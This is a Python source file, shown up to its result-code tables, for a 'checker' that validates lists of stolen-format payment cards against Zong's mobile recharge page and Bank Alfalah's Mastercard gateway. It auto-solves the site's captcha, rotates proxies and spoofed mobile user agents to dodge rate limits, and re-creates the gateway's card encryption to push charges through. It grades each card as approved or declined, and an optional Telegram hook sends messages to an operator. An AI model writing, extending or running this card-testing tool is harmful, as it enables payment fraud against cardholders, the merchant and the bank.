#!/usr/bin/env python3
"""
ShopI Checker — Zong Online Recharge card checker (single-file, complete)
Bank Alfalah / MPGS gateway (merchant: CMPAKLTD, SAQ-A)

Full flow (identical to Node.js server):
  1. Fetch Zong page → extract CSRF + captcha base64
  2. NopeCHA         → auto-solve 4-char image captcha
  3. Zong CreateOrder → MPGS session ID + order details
  4. probeAndUpdateMpgsSession:
       a. REST PUT /version/{v}/merchant/{m}/session/{s}  (always 401 for CMPAKLTD)
       b. HPF flow: pageState → JWE encrypt → performPayment  ← real result
       c. Page POST /api/page/version/{v}/pay              (diagnostic fallback)
  5. Interpret {success, threeDsRequired, gatewayCode} → approved / declined / error

Flask endpoints:
  POST /api/zong          — auto-solve (NopeCHA, retried 3×)
  POST /api/zong/prepare  — fetch page + return captcha image for manual solve
  POST /api/zong/submit   — submit with stored sessionId + typed captcha code
  POST /api/zong/batch    — batch check (sequential, paced)
  GET  /                  — health check

CLI usage:
  python checker.py <msisdn> <CC|MM|YY|CVV> [amount] [proxy]

Requirements:
  pip install flask requests cryptography

Environment variables:
  NC_API_KEY              NopeCHA API key (required for auto-solve)
  TELEGRAM_BOT_TOKEN      Telegram bot token (optional)
  TELEGRAM_ADMIN_CHAT_ID  Telegram chat ID  (optional)
  PORT                    HTTP listen port  (default 5000)
"""

import os, re, sys, json, time, base64, random, threading, logging, uuid
from urllib.parse import urlparse
import requests
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from flask import Flask, request, jsonify

# ──────────────────────────────────────────────────────────────────────────────
# Configuration
# ──────────────────────────────────────────────────────────────────────────────

NC_API_KEY             = os.environ.get("NC_API_KEY") or os.environ.get("NOPECHA_KEY") or ""
TELEGRAM_BOT_TOKEN     = os.environ.get("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_ADMIN_CHAT_ID = os.environ.get("TELEGRAM_ADMIN_CHAT_ID", "")
PORT                   = int(os.environ.get("PORT", 5000))

ZONG_BASE  = "https://onlinerecharge.zong.com.pk/OnlineRecharge"
MPGS_HOST  = "https://bankalfalah.gateway.mastercard.com"
MPGS_BASE  = f"{MPGS_HOST}/api/rest"
MERCHANT   = "CMPAKLTD"

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger(__name__)

# ──────────────────────────────────────────────────────────────────────────────
# MPGS HPF RSA public key  (hardcoded from hpf.js, isToggleOn=false)
# CMPAKLTD merchant privilege = NO_CARDS_SUBMITTED_THROUGH_API_SAQ_A
# Card data MUST go through the HPF encrypted channel — REST PUT always 401.
# ──────────────────────────────────────────────────────────────────────────────

_HPF_RSA_N_HEX = (
    "b86072619596586ce4c25e162c91bd73249976547afa3442295e7f1fd6e99d18"
    "de08ce23b122093229e1f768dfe47fafaadeab2aed45765aa5811a52ff098860"
    "e9aafafbe5cbffdda2182f56b9b7af6055ba456be96b48f5c570436b5d57adf5"
    "59c3a50b731ebe53d816d8955f33a2171ef30bffdd62e475a7012392981a9d90"
    "fa872ce92aed18e256e952b9aa8f7b5dd9dcfd92a2c55ad1e7cc4dbd35644576"
    "7d86367a60ba3889cc28489aa10432f9b45b7110b150ad83de25aee5ca9f525c"
    "7fd60eba37534e3bd23f6e7f87b0adc3d49a200254ed1aa02a2fb9da582111bf"
    "f74ca173132c5d29a8feb2aedda8d4cf40cab93b2cd2d6edd8c29a760292ae0d"
)
_HPF_RSA_E = 65537

_HPF_RSA_KEY = RSAPublicNumbers(
    e=_HPF_RSA_E,
    n=int(_HPF_RSA_N_HEX, 16),
).public_key(default_backend())


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def encrypt_hpf_card_data(plaintext: str) -> str:
    """
    MPGS HPF legacy JWE: RSA1_5 key-wrap + AES-128-CBC.
    Replicates hpf.js jsonWebEncryption() (isToggleOn=false path).

    plaintext format:  s=SESSION&m=MERCHANT&cn=CARDNUM&csc=CVV&xm=MM&xy=YY2
    output format:     b64url(header).b64url(RSA(16rand+aesKey)).b64url(IV).b64url(AES(plaintext))
    """
    # Header — exact string from hpf.js (spaces are significant for MPGS)
    header = '{"alg":"RSA1_5","enc":"A128CBC-HS256", "typ":"tns-noauth"}'
    f_part = b64url(header.encode())

    iv      = os.urandom(16)
    aes_key = os.urandom(16)

    # RSA plaintext = 16 random bytes || aes_key (MPGS extracts last 16 as the key)
    rsa_plain = os.urandom(16) + aes_key
    rsa_ct    = _HPF_RSA_KEY.encrypt(rsa_plain, asym_padding.PKCS1v15())
    g_part    = b64url(rsa_ct)

    # AES-128-CBC with PKCS7 padding
    cipher  = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
    enc     = cipher.encryptor()
    pt_b    = plaintext.encode()
    pad_len = 16 - (len(pt_b) % 16)
    pt_b   += bytes([pad_len] * pad_len)
    aes_ct  = enc.update(pt_b) + enc.finalize()

    return f"{f_part}.{g_part}.{b64url(iv)}.{b64url(aes_ct)}"


# ──────────────────────────────────────────────────────────────────────────────
# User-agent pools
# ──────────────────────────────────────────────────────────────────────────────

# Zong is a Pakistani mobile-first portal — desktop UAs trigger stricter limits.
# Real users browse from Android Chrome; mimic that fingerprint exactly.
_ZONG_MOBILE_UAS = [
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.113 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.113 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Redmi Note 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.118 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; vivo V23 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.119 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; TECNO Spark 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.179 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Infinix X6817) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.118 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; OPPO A76) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.119 Mobile Safari/537.36",
]

def get_zong_ua() -> str:
    return random.choice(_ZONG_MOBILE_UAS)


def zong_page_headers(ua: str) -> dict:
    return {
        "User-Agent":               ua,
        "Accept":                   "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language":          "en-US,en;q=0.9,ur;q=0.8",
        "Accept-Encoding":          "gzip, deflate, br",
        "Connection":               "keep-alive",
        "Upgrade-Insecure-Requests":"1",
        "sec-ch-ua":                '"Chromium";v="125", "Not.A/Brand";v="24"',
        "sec-ch-ua-mobile":         "?1",
        "sec-ch-ua-platform":       '"Android"',
        "Sec-Fetch-Site":           "none",
        "Sec-Fetch-Mode":           "navigate",
        "Sec-Fetch-User":           "?1",
        "Sec-Fetch-Dest":           "document",
    }


def zong_ajax_headers(ua: str) -> dict:
    return {
        "Content-Type":     "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Referer":          ZONG_BASE,
        "Origin":           "https://onlinerecharge.zong.com.pk",
        "User-Agent":       ua,
        "Accept":           "application/json, text/javascript, */*; q=0.01",
        "Accept-Language":  "en-US,en;q=0.9,ur;q=0.8",
        "Accept-Encoding":  "gzip, deflate, br",
        "sec-ch-ua":        '"Chromium";v="125", "Not.A/Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "Sec-Fetch-Site":   "same-origin",
        "Sec-Fetch-Mode":   "cors",
        "Sec-Fetch-Dest":   "empty",
    }


# ──────────────────────────────────────────────────────────────────────────────
# Proxy helpers
# ──────────────────────────────────────────────────────────────────────────────

def make_proxies(proxy: str | None) -> dict | None:
    """Convert 'host:port[:user:pass]' or 'proto://host:port' to requests proxy dict."""
    if not proxy or not proxy.strip():
        return None
    raw = proxy.strip()
    if re.match(r"^[a-z][a-z0-9+.\-]*://", raw, re.I):
        return {"http": raw, "https": raw}
    parts = raw.split(":")
    if len(parts) < 2:
        return None
    host, port = parts[0], parts[1]
    user = parts[2] if len(parts) > 2 else ""
    pwd  = parts[3] if len(parts) > 3 else ""
    auth = f"{user}:{pwd}@" if user and pwd else ""
    url  = f"http://{auth}{host}:{port}"
    return {"http": url, "https": url}


# ──────────────────────────────────────────────────────────────────────────────
# NopeCHA image captcha solver
# ──────────────────────────────────────────────────────────────────────────────

_NC_RETRY_CODES = {9, 14, 6, 7}   # "pending" codes — keep polling

def solve_image_captcha(image_b64: str, timeout_s: int = 90) -> dict:
    """
    Submit a text/image captcha to NopeCHA and poll until solved.
    Returns {"text": "XXXX"} on success or {"error": "..."} on failure.
    """
    if not NC_API_KEY:
        return {"error": "NC_API_KEY not set — cannot auto-solve captcha"}
    try:
        r = requests.post(
            "https://api.nopecha.com/",
            json={"type": "textcaptcha", "key": NC_API_KEY, "image_data": [image_b64]},
            timeout=20,
        )
        data = r.json()
    except Exception as e:
        return {"error": f"NopeCHA submit: {e}"}

    err = data.get("error")
    if err not in (0, None):
        return {"error": f"NopeCHA submit error {err}: {data.get('message', '')}"}
    task_id = data.get("data")
    if not task_id:
        return {"error": "NopeCHA returned no task ID"}

    deadline = time.time() + timeout_s
    while time.time() < deadline:
        time.sleep(3)
        try:
            pr = requests.get(
                "https://api.nopecha.com/",
                params={"type": "textcaptcha", "key": NC_API_KEY, "id": task_id},
                timeout=15,
            )
            pd = pr.json()
        except Exception:
            continue
        perr = pd.get("error")
        if perr in _NC_RETRY_CODES:
            continue
        if perr in (0, None):
            arr  = pd.get("data") or []
            text = str(arr[0]).strip() if arr else ""
            return {"text": text} if text else {"error": "NopeCHA returned empty text"}
        return {"error": f"NopeCHA poll error {perr}: {pd.get('message', '')}"}
    return {"error": "NopeCHA timed out"}


# ──────────────────────────────────────────────────────────────────────────────
# Zong page helpers
# ──────────────────────────────────────────────────────────────────────────────

def fetch_zong_page(proxy: str | None = None) -> dict:
    """Fetch Zong home page. Returns {html, cookies, ua}."""
    ua  = get_zong_ua()
    prx = make_proxies(proxy)
    r   = requests.get(
        ZONG_BASE,
        headers=zong_page_headers(ua),
        proxies=prx,
        timeout=20,
        allow_redirects=True,
    )
    return {"html": r.text, "cookies": r.cookies, "ua": ua, "status": r.status_code}


def extract_zong_page(html: str, cookies) -> dict:
    """
    Extract CSRF token, captcha base64, and checkout URLs from Zong HTML.
    Returns {csrf, captcha_b64, cookie_header, return_url, cancel_url}.
    """
    csrf_m = (
        re.search(r'name="__RequestVerificationToken"[^>]+value="([^"]+)"', html) or
        re.search(r'value="([^"]+)"[^>]+name="__RequestVerificationToken"', html)
    )
    csrf = csrf_m.group(1) if csrf_m else ""

    cap_m      = re.search(r'src="data:image/[^;]+;base64,\s*([^"]+)"', html)
    captcha_b64 = cap_m.group(1).replace(" ", "").replace("\n", "") if cap_m else ""

    # Build cookie header from RequestsCookieJar
    cookie_header = "; ".join(f"{k}={v}" for k, v in cookies.items())

    return_url_m = re.search(r"""['"]?returnUrl['"]?\s*:\s*['"]([^'"]+)['"]""", html)
    cancel_url_m = re.search(r"""['"]?cancelUrl['"]?\s*:\s*['"]([^'"]+)['"]""", html)
    return_url   = return_url_m.group(1) if return_url_m else f"{ZONG_BASE}/Order/PaymentReturn"
    cancel_url   = cancel_url_m.group(1) if cancel_url_m else f"{ZONG_BASE}/Order/PaymentCancel"

    return {
        "csrf":          csrf,
        "captcha_b64":   captcha_b64,
        "cookie_header": cookie_header,
        "return_url":    return_url,
        "cancel_url":    cancel_url,
    }


def post_create_order(
    csrf: str,
    cookies,
    msisdn: str,
    amount: str,
    captcha_code: str,
    ua: str,
    proxy: str | None = None,
) -> dict:
    """
    Submit Zong CreateOrder form.
    captcha_code is trimmed to 4 chars — Zong always uses 4; NopeCHA may return 5.
    Returns order data dict (ok=True) or error dict (ok=False, captcha_fail bool).
    """
    trimmed = captcha_code.strip()[:4]   # ← critical: 4-char trim
    prx     = make_proxies(proxy)
    r       = requests.post(
        f"{ZONG_BASE}/Order/CreateOrder",
        data={
            "__RequestVerificationToken": csrf,
            "MSISDN":                      msisdn,
            "AMOUNT":                      amount,
            "PAYMENT_METHOD_TYPE_ID":      "1",
            "WALLET_ACCOUNT_NUM":          "",
            "CAPTCHA_CODE":                trimmed,
        },
        headers=zong_ajax_headers(ua),
        cookies=cookies,
        proxies=prx,
        timeout=25,
        allow_redirects=False,
    )

    try:
        data = r.json()
    except Exception:
        return {"ok": False, "captcha_fail": False,
                "message": f"CreateOrder non-JSON (HTTP {r.status_code})"}

    if not data.get("Success"):
        errors  = (data.get("Data") or {}).get("Errors") or []
        msg     = errors[0].get("ErrorMessage", "") if errors else ""
        msg     = msg or str(data.get("Message") or data.get("UserMessage") or "Order creation failed")
        return {"ok": False, "captcha_fail": bool(re.search(r"captcha", msg, re.I)), "message": msg}

    d = data.get("Data") or {}
    log.info("[zong-order-data] %s", json.dumps({k: str(v)[:200] for k, v in d.items()}))
    return {
        "ok":               True,
        "merchant_id":      str(d.get("MerchantId",       MERCHANT)),
        "mpgs_session_id":  str(d.get("SessionId",        "")),
        "checkout_js_url":  str(d.get("CheckoutJsUrl",    "")),
        "order_id":         str(d.get("OrderId",          "")),
        "amount":           str(d.get("Amount",           amount)),
        "signature":        str(d.get("Signature",        "")),
        "gateway_op":       str(d.get("GatewayOperation", "PURCHASE")),
    }


# ──────────────────────────────────────────────────────────────────────────────
# MPGS correlation token (from checkout.js)
# ──────────────────────────────────────────────────────────────────────────────

def fetch_mpgs_correlation(checkout_js_url: str) -> str | None:
    """
    Fetch the dynamic MPGS checkout.min.js URL and extract the embedded
    correlation token from headers or body. Used by the REST PUT path.
    Returns the token string or None if not found.
    """
    if not checkout_js_url or checkout_js_url in ("", "null"):
        return None
    try:
        r = requests.get(
            checkout_js_url,
            headers={
                "User-Agent":      get_zong_ua(),
                "Referer":         ZONG_BASE + "/",
                "Origin":          "https://onlinerecharge.zong.com.pk",
                "Accept":          "*/*",
                "Accept-Language": "en-US,en;q=0.9",
                "Sec-Fetch-Dest":  "script",
                "Sec-Fetch-Mode":  "no-cors",
                "Sec-Fetch-Site":  "cross-site",
            },
            timeout=15,
        )
        log.info("mpgs checkout.js: HTTP %s len=%s", r.status_code, len(r.text))

        # Headers first
        for hdr in ("x-correlation-id", "correlation-id", "x-mpgs-correlation"):
            v = r.headers.get(hdr)
            if v:
                log.info("mpgs correlation from header")
                return v

        # Search JS body
        body     = r.text
        patterns = [
            r'"correlation"\s*:\s*"([^"]{8,256})"',
            r"'correlation'\s*:\s*'([^']{8,256})'",
            r'[,{]\s*correlation\s*:\s*"([^"]{8,256})"',
            r'correlationId\s*[=:]\s*"([^"]{8,256})"',
            r'["\']correlationId["\']\s*:\s*["\']([^"\']{8,256})["\']',
        ]
        for pat in patterns:
            m = re.search(pat, body, re.I)
            if m:
                log.info("mpgs correlation from body")
                return m.group(1)

        log.info("mpgs correlation not found in checkout.js")
        return None
    except Exception as e:
        log.warning("mpgs checkout.js fetch failed: %s", e)
        return None


# ──────────────────────────────────────────────────────────────────────────────
# MPGS REST PUT session  (version probe)
# NOTE: CMPAKLTD has merchantPrivilege=NO_CARDS_SUBMITTED_THROUGH_API_SAQ_A —
#       every REST PUT returns 401. This probe runs first for completeness/
#       future merchants; HPF is the real working path for Zong/Bank Alfalah.
# ──────────────────────────────────────────────────────────────────────────────

def rest_put_session(
    merchant_id: str,
    mpgs_session_id: str,
    mpgs_base: str,
    card: dict,
    version: int,
) -> tuple[dict, int]:
    """
    PUT card data to MPGS REST API for a single version.
    Returns (response_json_or_partial, http_status).
    """
    expiry_year = card["yy"][-2:]
    body = json.dumps({
        "sourceOfFunds": {
            "provided": {
                "card": {
                    "nameOnCard":   "Account Holder",
                    "number":       card["cc"],
                    "securityCode": card["cvv"],
                    "expiry":       {"month": card["mm"], "year": expiry_year},
                }
            },
            "type": "CARD",
        }
    })
    url  = f"{mpgs_base}/version/{version}/merchant/{merchant_id}/session/{mpgs_session_id}"
    try:
        r    = requests.put(
            url,
            data=body,
            headers={
                "Content-Type": "application/json",
                "Accept":       "application/json",
                "Origin":       "https://onlinerecharge.zong.com.pk",
                "Referer":      ZONG_BASE + "/",
            },
            timeout=8,
        )
        try:
            return r.json(), r.status_code
        except Exception:
            return {"_raw": r.text[:500]}, r.status_code
    except Exception as e:
        log.info("mpgs REST PUT v%s error: %s", version, e)
        return {}, 0


# ──────────────────────────────────────────────────────────────────────────────
# MPGS Page POST  (/api/page/version/{v}/pay)
# Diagnostic fallback — always fails for SAQ-A merchants with "Unexpected parameter"
# but captures the MPGS error message for logging purposes.
# ──────────────────────────────────────────────────────────────────────────────

def try_mpgs_page_post(
    merchant_id: str,
    order_id: str,
    mpgs_session_id: str,
    version: int,
    mpgs_host: str,
    card: dict,
    return_url: str,
    cancel_url: str,
    signature: str,
    gateway_op: str,
) -> dict | None:
    """
    POST card data to MPGS Payment Page (/api/page/version/{v}/pay).

    Key rules from landing.js reverse-engineering:
    - Referer MUST be {mpgsHost}/static/checkout/landing/index.html
    - interaction.cancelUrl MUST be "urn:hostedCheckout:defaultCancelUrl"
    - Do NOT include order.amount / order.currency / signature (pre-set in session)
    - Do NOT follow redirects; parse JSON body directly
    """
    expiry_year = card["yy"][-2:]
    ua          = get_zong_ua()
    form_data   = {
        "merchant":                                 merchant_id,
        "order.id":                                 order_id,
        "session.id":                               mpgs_session_id,
        "interaction.cancelUrl":                    "urn:hostedCheckout:defaultCancelUrl",
        "sourceOfFunds.provided.card.number":       card["cc"],
        "sourceOfFunds.provided.card.securityCode": card["cvv"],
        "sourceOfFunds.provided.card.expiry.month": card["mm"],
        "sourceOfFunds.provided.card.expiry.year":  expiry_year,
        "sourceOfFunds.provided.card.nameOnCard":   "Account Holder",
    }
    try:
        r = requests.post(
            f"{mpgs_host}/api/page/version/{version}/pay",
            data=form_data,
            headers={
                "Content-Type":     "application/x-www-form-urlencoded",
                "Referer":          f"{mpgs_host}/static/checkout/landing/index.html",
                "Origin":           mpgs_host,
                "User-Agent":       ua,
                "Accept":           "application/json, text/javascript, */*; q=0.01",
                "X-Requested-With": "XMLHttpRequest",
            },
            timeout=25,
            allow_redirects=False,   # parse JSON body directly — not the redirect page
        )
        raw = r.text
        try:
            page_json = r.json()
        except Exception:
            page_json = {}

        location  = r.headers.get("location", "")
        pg_result = str(page_json.get("result", "UNKNOWN"))
        err_blk   = page_json.get("error") or {}
        pg_cause  = str(err_blk.get("cause", ""))
        pg_expl   = str(err_blk.get("explanation", ""))
        gw_code   = str(page_json.get("gatewayCode", ""))

        # Fallback: parse redirect Location URL for result params
        if pg_result == "UNKNOWN" and location:
            try:
                from urllib.parse import urlparse, parse_qs
                qs       = parse_qs(urlparse(location).query)
                pg_result = qs.get("result",            ["UNKNOWN"])[0]
                pg_cause  = qs.get("error.cause",       [pg_cause])[0]
                pg_expl   = qs.get("error.explanation",  [pg_expl])[0]
            except Exception:
                pass

        log.info("mpgs page post: HTTP %s result=%s gw=%s expl=%s",
                 r.status_code, pg_result, gw_code, pg_expl[:80])

        return {
            "mpgs_data": {
                "_via":        "pagePost",
                "result":      pg_result,
                "gateway_code": gw_code,
                "error":       {"cause": pg_cause, "explanation": pg_expl},
                "location":    location,
                "raw":         raw[:400],
            },
            "mpgs_status": r.status_code,
        }
    except Exception as e:
        log.info("mpgs page post failed: %s", e)
        return None


# ──────────────────────────────────────────────────────────────────────────────
# MPGS HPF flow  (pageState → JWE encrypt → performPayment)
# This is the ONLY working path for CMPAKLTD (SAQ-A, HPF-only merchant).
# ──────────────────────────────────────────────────────────────────────────────

def try_hpf_flow(
    merchant_id: str,
    mpgs_session_id: str,
    mpgs_host: str,
    card: dict,
    return_url: str,
    ua: str,
) -> dict | None:
    """
    3-step MPGS Hosted Payment Form flow (confirmed working for CMPAKLTD).

    Step 1: POST /checkout/api/pageState/SESSION  → transactionId
    Step 2: POST /form/SESSION?charset=UTF-8      → JWE card data stored in session
            (response is always 0~OK — NOT the auth result)
    Step 3: POST /checkout/api/performPayment/SESSION → real {success, threeDsRequired, gatewayCode}

    Notes:
    - /form always returns 0~OK; ignore it, proceed to performPayment.
    - performPayment does NOT need MPGS cookies; transactionId is sufficient.
    - Zong PaymentReturn always 404 (ASP.NET state loss) — do NOT use as signal.
    """
    referer = f"{mpgs_host}/checkout/pay/{mpgs_session_id}"

    # ── Step 1: pageState → transactionId ────────────────────────────────────
    transaction_id = "1"
    try:
        ps = requests.post(
            f"{mpgs_host}/checkout/api/pageState/{mpgs_session_id}",
            data="paRes=&timezoneOffset=5&gatewayRecommendation=",
            headers={
                "Content-Type":     "application/x-www-form-urlencoded",
                "Accept":           "application/json",
                "X-Requested-With": "XMLHttpRequest",
                "Origin":           mpgs_host,
                "Referer":          referer,
                "User-Agent":       ua,
            },
            timeout=12,
        )
        if ps.ok:
            ps_data = ps.json()
            if ps_data.get("transactionId"):
                transaction_id = str(ps_data["transactionId"])
        log.info("hpf pageState → transactionId=%s", transaction_id)
    except Exception as e:
        log.warning("hpf pageState failed (non-fatal): %s", e)

    # ── Step 2: Encrypt card + POST to /form/SESSION/ ────────────────────────
    expiry_year = card["yy"][-2:]
    hpf_payload = (
        f"s={mpgs_session_id}&m={merchant_id}"
        f"&cn={card['cc']}&csc={card['cvv']}"
        f"&xm={card['mm']}&xy={expiry_year}"
    )
    try:
        encrypted_d = encrypt_hpf_card_data(hpf_payload)
        log.info("hpf card encrypted (%d chars)", len(encrypted_d))
    except Exception as e:
        log.error("hpf encrypt failed: %s", e)
        return None

    hpf_http_status = 0
    try:
        hpf_r = requests.post(
            f"{mpgs_host}/form/{mpgs_session_id}?charset=UTF-8",
            data={"d": encrypted_d, "rc": "1", "gatewayReturnURL": return_url},
            headers={
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Accept":       "text/html,application/xhtml+xml,*/*;q=0.8",
                "Origin":       mpgs_host,
                "Referer":      referer,
                "User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            },
            timeout=20,
            allow_redirects=True,
        )
        hpf_http_status = hpf_r.status_code
        log.info("hpf form POST → HTTP %s", hpf_http_status)
        # Response is always "Submitted payment details" (0~OK) — not the real result.
        # Discard and proceed to performPayment.
    except Exception as e:
        log.error("hpf form POST failed: %s", e)
        return None

    # ── Step 3: performPayment → real authorization result ───────────────────
    try:
        perf_r = requests.post(
            f"{mpgs_host}/checkout/api/performPayment/{mpgs_session_id}",
            data={
                "hpfSessionId":   mpgs_session_id,
                "transactionId":  transaction_id,
                "paymentMethod":  "CARD",
                "paymentAttempt": "1",
            },
            headers={
                "Content-Type":     "application/x-www-form-urlencoded; charset=UTF-8",
                "Accept":           "application/json, text/javascript, */*; q=0.01",
                "X-Requested-With": "XMLHttpRequest",
                "Origin":           mpgs_host,
                "Referer":          referer,
                "User-Agent":       ua,
            },
            timeout=30,
        )
        log.info("hpf performPayment → HTTP %s body=%s",
                 perf_r.status_code, perf_r.text[:300])

        perf_json    = perf_r.json()
        success      = perf_json.get("success") is True
        three_ds_req = perf_json.get("threeDsRequired") is True
        gateway_code = str(perf_json.get("gatewayCode") or
                          perf_json.get("GatewayRecommendation") or "")
        mpgs_result  = ("SUCCESS"      if success
                        else "3DS_REQUIRED" if three_ds_req
                        else "FAILURE")

        return {
            "mpgs_data": {
                "_via":            "hpf",
                "result":          mpgs_result,
                "gateway_code":    "APPROVED" if success else gateway_code,
                "three_ds_req":    three_ds_req,
                "perf_json":       perf_json,
                "hpf_http_status": hpf_http_status,
            },
            "mpgs_status": perf_r.status_code,
            "used_version": "74-hpf",
        }
    except Exception as e:
        log.error("hpf performPayment failed: %s", e)
        return None


# ──────────────────────────────────────────────────────────────────────────────
# probeAndUpdateMpgsSession  (REST probe → HPF fallback → page POST fallback)
# Mirrors the Node.js function exactly, including version-probe loop.
# ──────────────────────────────────────────────────────────────────────────────

def probe_and_update_mpgs_session(
    merchant_id: str,
    mpgs_session_id: str,
    checkout_js_url: str,
    order_id: str,
    amount: str,
    card: dict,
    return_url: str,
    cancel_url: str,
    signature: str,
    gateway_op: str,
    zong_ua: str,
) -> dict:
    """
    Main MPGS session update function. Tries three paths in order:

    1. REST PUT version probe (v32-84, centre-out from detected version)
       → always 401 for CMPAKLTD (SAQ-A) but kept for completeness.
    2. HPF flow (pageState → JWE encrypt → performPayment)
       → the ONLY working path for CMPAKLTD.
    3. Page POST /api/page/version/{v}/pay
       → diagnostic fallback; also always fails for SAQ-A.

    Returns {"mpgs_data": {...}, "mpgs_status": int, "used_version": str}.
    """
    # Extract version and host from CheckoutJsUrl
    url_ver_m   = re.search(r"/version/(\d+)", checkout_js_url or "")
    start_ver   = int(url_ver_m.group(1)) if url_ver_m else 74

    mpgs_base   = MPGS_BASE
    if checkout_js_url and checkout_js_url not in ("", "null"):
        try:
            origin = "{0.scheme}://{0.netloc}".format(urlparse(checkout_js_url))
            if origin and "null" not in origin:
                mpgs_base = f"{origin}/api/rest"
        except Exception:
            pass

    mpgs_host_local = mpgs_base.replace("/api/rest", "")
    log.info("mpgs probe start: v%s base=%s", start_ver, mpgs_base)

    # Build centre-out version probe order (32-84)
    all_versions = list(range(32, 85))
    all_versions.sort(key=lambda v: abs(v - start_ver))
    version_probes = [start_ver] + [v for v in all_versions if v != start_ver]

    mpgs_data   = {}
    mpgs_status = 0
    used_version = str(start_ver)

    # ── Path 1: REST PUT probe ────────────────────────────────────────────────
    for v in version_probes:
        data, status = rest_put_session(merchant_id, mpgs_session_id, mpgs_base, card, v)
        if not data and status == 0:
            continue   # network/timeout error — skip version

        err_blk    = data.get("error") or {}
        is_ver_mm  = (str(err_blk.get("validationType", "")) == "INVALID"
                      and str(err_blk.get("field", "")) == "version")

        log.info("mpgs probe v%s: HTTP %s result=%s version_mismatch=%s",
                 v, status, data.get("result"), is_ver_mm)

        if is_ver_mm:
            continue   # wrong version — try next

        mpgs_data   = data
        mpgs_status = status
        used_version = str(v)
        break

    # ── Path 2: HPF (triggered when REST returns 401 or no result) ───────────
    rest_auth_failed = (mpgs_status == 401 or
                        (mpgs_status == 0 and not mpgs_data.get("result")))
    if rest_auth_failed:
        hpf = try_hpf_flow(
            merchant_id, mpgs_session_id, mpgs_host_local, card, return_url, zong_ua
        )
        if hpf:
            return hpf

        # ── Path 3: Page POST (diagnostic fallback) ───────────────────────────
        confirmed_ver = int(used_version) if mpgs_status == 401 else start_ver
        page = try_mpgs_page_post(
            merchant_id, order_id, mpgs_session_id,
            confirmed_ver, mpgs_host_local,
            card, return_url, cancel_url, signature, gateway_op,
        )
        if page:
            return {
                "mpgs_data":    page["mpgs_data"],
                "mpgs_status":  page["mpgs_status"],
                "used_version": f"{start_ver}-page",
            }

    return {
        "mpgs_data":    mpgs_data,
        "mpgs_status":  mpgs_status,
        "used_version": used_version,
    }


# ──────────────────────────────────────────────────────────────────────────────
# Telegram
# ──────────────────────────────────────────────────────────────────────────────

def notify_telegram(text: str) -> None:
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_ADMIN_CHAT_ID:
        return
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            json={
                "chat_id":                  TELEGRAM_ADMIN_CHAT_ID,
                "text":                     text,
                "parse_mode":               "HTML",
                "disable_web_page_preview": True,
            },
            timeout=10,
        )
    except Exception:
        pass


def esc_html(s: str) -> str:
    return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


# ──────────────────────────────────────────────────────────────────────────────
# Card parser
# ──────────────────────────────────────────────────────────────────────────────

def parse_card(raw: str) -> dict | None:
    """Parse 'CC|MM|YY|CVV' (also accepts YYYY). Returns None on invalid input."""
    parts = [p.strip() for p in raw.strip().replace(" ", "|").split("|")]
    if len(parts) < 4:
        return None
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    if not re.match(r"^\d{13,19}$", cc):
        return None
    if not re.match(r"^\d{1,2}$", mm) or not (1 <= int(mm) <= 12):
        return None
    if not re.match(r"^\d{2,4}$", yy):
        return None
    return {"cc": cc, "mm": mm.zfill(2), "yy": yy, "cvv": cvv}


# ──────────────────────────────────────────────────────────────────────────────
# Result interpretation
# ──────────────────────────────────────────────────────────────────────────────

_APPROVED_CODES = {
    "APPROVED", "APPROVED_PENDING_SETTLEMENT", "APPROVED_AUTO_SETTLEMENT",
    "APPROVED_PENDING_SETTLEMENT_PARTIAL", "SUBMITTED",
}
_DECLINED_CODES = {
    "DECLINED", "DECLINED_DO_NOT_CONTACT", "EXPIRED_CARD",
    "EXCEEDS_WITHDRAWAL_AMOUNT_LIMIT", "DO_NOT_HONOUR", "INSUFFICIENT_FUNDS",
    "INVALID_CARD_NUMBER", "LOST_CARD", "STOLEN_CARD", "BLOCKED_CARD",
    "RESTRICTED_CARD", "CARD_VELOCITY_EXCEEDED", "AUTHENTICATION_FAILED",
    "NOT_ENROLLED", "TRANSACTION_NOT_PERMITTED", "LIMIT_EXCEEDED", "NOT_SUPPORTED",
}

